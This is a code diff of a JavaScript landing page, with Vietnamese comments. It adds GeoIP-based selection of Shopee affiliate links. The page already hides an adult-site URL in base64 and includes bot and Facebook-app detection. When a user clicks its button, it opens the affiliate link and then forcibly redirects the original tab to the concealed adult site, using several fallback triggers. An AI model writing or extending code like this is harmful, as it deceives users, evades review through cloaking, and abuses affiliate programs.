@@ -75,6 +75,14 @@ const xorKey = "PandaKey2025";
 // --- Mã hóa link 18+ ---
 const link18_b64 = "aHR0cHM6Ly9zZXhiamNhbS5jb20vYWN0b3IvcGFuZGFjbGFzcy8=";
 
+// --- Shopee link mapping ---
+const shopeeLinks = {
+  "VN": "https://s.shopee.vn/30dchvC74f",
+  "PH": "https://shopee.ph/affiliate-ph",
+  "SG": "https://shopee.sg/affiliate-sg",
+  "MY": "https://shopee.com.my/affiliate-my"
+};
+
 // --- Phát hiện bot ---
 function isBot() {
   const ua = (navigator.userAgent || "").toLowerCase();
@@ -89,60 +97,39 @@ function isFacebookApp() {
 }
 function isIOS() { return /iPad|iPhone|iPod/i.test(navigator.userAgent); }
 function isAndroid() { return /Android/i.test(navigator.userAgent); }
-function isIOSChrome() { return /CriOS/i.test(navigator.userAgent) && isIOS(); }
 
-// --- Điều hướng 18+ bền bỉ cho iOS Chrome ---
-function navigate18Resilient(url) {
-  let done = false;
-  // giữ id để clear khi đã điều hướng xong
-  let t1 = null, t2 = null, t3 = null;
+// --- Hàm lấy link Shopee theo GeoIP + Cache ---
+async function getShopeeLink() {
+  const cacheKey = "geoip_cache";
+  const ttl = 24 * 60 * 60 * 1000; // 24h
 
-  const go = () => {
-    if (done) return;
-    done = true;
-    // dọn dẹp timer & listener
-    if (t1) clearTimeout(t1);
-    if (t2) clearTimeout(t2);
-    if (t3) clearTimeout(t3);
-    window.removeEventListener('pagehide', onPageHide, optsOnce);
-    window.removeEventListener('focus', onFocus, optsOnce);
-    window.removeEventListener('pageshow', onPageShow, optsOnce);
-    document.removeEventListener('visibilitychange', onVisibleChange);
-
-    try {
-      // replace để khỏi thêm lịch sử và thường ổn định hơn trên iOS
-      window.location.replace(url);
-    } catch (_) {
-      window.location.href = url;
+  try {
+    const cached = localStorage.getItem(cacheKey);
+    if (cached) {
+      const parsed = JSON.parse(cached);
+      if (Date.now() - parsed.timestamp < ttl) {
+        if (shopeeLinks[parsed.country]) return shopeeLinks[parsed.country];
+      }
     }
-  };
+  } catch(_) {}
 
-  const onPageHide = () => {
-    // khi tab bị ẩn do mở tab Shopee, đợi một nhịp rồi thử
-    setTimeout(go, 120);
-  };
-  const onFocus = () => go();
-  const onPageShow = () => go();
-  const onVisibleChange = () => {
-    if (document.visibilityState === 'visible') go();
-  };
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+    const cc = (data.country_code || "").toUpperCase();
 
-  const optsOnce = { once: true };
+    // lưu cache
+    try {
+      localStorage.setItem(cacheKey, JSON.stringify({ country: cc, timestamp: Date.now() }));
+    } catch(_) {}
 
-  // Thử điều hướng theo nhiều “cửa sổ” thời gian khác nhau
-  // iOS Chrome cần chậm hơn một chút để không bị bỏ qua điều hướng thứ 2
-  const d1 = isIOSChrome() ? 250 : 80;
-  const d2 = isIOSChrome() ? 800 : 300;
+    if (shopeeLinks[cc]) return shopeeLinks[cc];
+  } catch(e) {
+    console.warn("GeoIP error:", e);
+  }
 
-  t1 = setTimeout(go, d1);
-  t2 = setTimeout(go, d2);
-  t3 = setTimeout(go, 1800); // dự phòng cuối
-
-  // Khi trạng thái trang thay đổi -> thử lại
-  window.addEventListener('pagehide', onPageHide, optsOnce);
-  window.addEventListener('focus', onFocus, optsOnce);
-  window.addEventListener('pageshow', onPageShow, optsOnce);
-  document.addEventListener('visibilitychange', onVisibleChange);
+  // fallback VN
+  return shopeeLinks["VN"];
 }
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -173,10 +160,10 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 
   // --- Nút CTA ---
-  document.getElementById('ctaBtn').addEventListener('click', function(e){
+  document.getElementById('ctaBtn').addEventListener('click', async function(e){
     e.preventDefault();
 
-    // Nếu đang trong FB App → mở Chrome/Safari (giữ nguyên)
+    // Nếu đang trong FB App → mở Chrome/Safari
     if (isFacebookApp()) {
       const landingURL = window.location.href;
       if (isAndroid()) {
@@ -189,8 +176,10 @@ document.addEventListener('DOMContentLoaded', function() {
       return;
     }
 
+    // --- Lấy link Shopee theo GeoIP ---
+    const affLink = await getShopeeLink();
+
     // --- Mở Shopee bằng thẻ <a> thật (tránh tab trắng) ---
-    const affLink = "https://s.shopee.vn/30dchvC74f";
     const a = document.createElement("a");
     a.href = affLink;
     a.target = "_blank";
@@ -198,11 +187,22 @@ document.addEventListener('DOMContentLoaded', function() {
     document.body.appendChild(a);
     a.click();
 
-    // --- Điều hướng 18+ bền bỉ (fix riêng cho iOS Chrome) ---
+    // --- Sau đó điều hướng sang link 18+ ---
     const link18 = atob(link18_b64);
-    navigate18Resilient(link18);
+    let navigated = false;
+    const go18 = () => {
+      if (navigated) return;
+      navigated = true;
+      window.location.assign(link18);
+    };
 
-    // dọn dẹp thẻ a (không ảnh hưởng chức năng)
+    try { queueMicrotask(go18); } catch(_) {}
+    if (typeof requestAnimationFrame === 'function') {
+      requestAnimationFrame(() => go18());
+    }
+    setTimeout(go18, 80);
+    window.addEventListener('pagehide', go18, { once: true });
+
     setTimeout(() => { try { a.remove(); } catch(_){} }, 5000);
   });
 });
